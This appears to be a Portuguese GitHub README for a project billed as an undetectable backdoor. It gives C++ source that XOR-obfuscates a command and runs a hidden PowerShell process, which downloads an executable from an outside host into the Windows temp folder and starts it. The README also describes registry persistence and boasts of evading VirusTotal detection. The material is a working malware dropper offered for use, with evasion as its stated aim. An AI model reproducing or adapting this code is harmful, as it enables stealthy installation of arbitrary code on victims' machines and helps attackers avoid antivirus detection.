# Backdoor-Indetectavel
A função do backdoor é fazer download de um executável via powershell direto na pasta e temp, em seguida executar o arquivo, tudo usando uma função onde a janela do console fica no modo em que não seja visível para o usuário. Esse método é comum em criadores de malware, onde muitos usam métodos mais complexos para evitar a detecção, como programar um arquivo onde ele fica dormindo até alguém pressionar uma tecla, ou até atingir um certo tempo, etc..  

### Criptografia Xor
A matemática da criptografia xor que fiz foi bem simples, onde a chave da criptação é o tamanho da string vezes 2 divido por 100, fazendo com que a chave seja a própia string deseja.
```c++
void Decrypter(char CriptXor[]) {  
    int QuantidadeString = strlen(CriptXor); // Determina o tamanho da string.
    for (int i = 0; i < QuantidadeString; i++){ 
        CriptXor[i] = CriptXor[i] ^ (QuantidadeString*2/100); // A chave da criptografia é o tamanho da string * 2 / 100.
    } 
} 
```
![Encript](https://user-images.githubusercontent.com/88719652/129620582-31e6f1bc-1025-4365-8511-b6aac50d4ac0.png)

### CreateProcess
Essa parte do código cria o processo powershell usando API do windows, abrindo o processo onde os seguintes comando são coordenados para fazer, fazer download do executável MrQuerino.exe via "wget", alocando na pasta temp com o nome de WelCome.exe e na sequência executando.


> powershell.exe wget https://github.com/andreyquerino/Backdoor-Indetectavel/blob/main/MrQuerino.exe?raw=true -o C:\\windows\\temp\\WelCome.exe;start C:\\windows\\temp\\WelCome.exe

```c++
void Run() {
   char processo[] = "sltfqpkfoo-f{f#tdfw#kwwsp9,,djwkva-`ln,bmgqfzrvfqjml,Ab`hgllq.Jmgfwf`wbufo,aola,nbjm,NqRvfqjml-f{f<qbt>wqvf#.l#@9__tjmgltp__wfns__Tfo@lnf-f{f8pwbqw#@9__tjmgltp__wfns__Tfo@lnf-f{f";
   Decrypter(processo); //Função para decriptar
   STARTUPINFO pinfo; //contém detalhes de como todas as coisas devem ser cuidadas antes do início do processo 
   PROCESS_INFORMATION info; //contém detalhes sobre o novo processo, processo pai, seu processo filho, outros threads e como ele funcionará 
   memset(&pinfo, 0, sizeof(pinfo));
   CreateProcess(NULL, processo, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &pinfo, &info); //API CreateProcess que cria um processo powershell.exe usando a variável acima e canaliza a entrada, saída e erro para o HANDLE usando o & info criado acima
}
```
https://user-images.githubusercontent.com/88719652/129621046-196b336d-e839-473c-8691-9380c64cf998.mp4

### Persistência
Como bônus tive liberdade criar um registro de persistência no windows onde toda vez que iniciar o sistema abra o executável.<br \>
![persistencia](https://user-images.githubusercontent.com/88719652/129620696-eac13434-65d5-407f-8987-7b69fdc930f2.png)


### Virus Total 
Até a data desta postam, não teve detecção no virus total.
https://www.virustotal.com/gui/file/8ff653ded39076b02dea1ab8ec367afc16d2b8e8e5f6c7e92b1a8572f2147748/detection <br \>
![virus-total](https://user-images.githubusercontent.com/88719652/129620707-6fe47fc6-3df1-44e9-aea7-15f0c8aa3494.png)

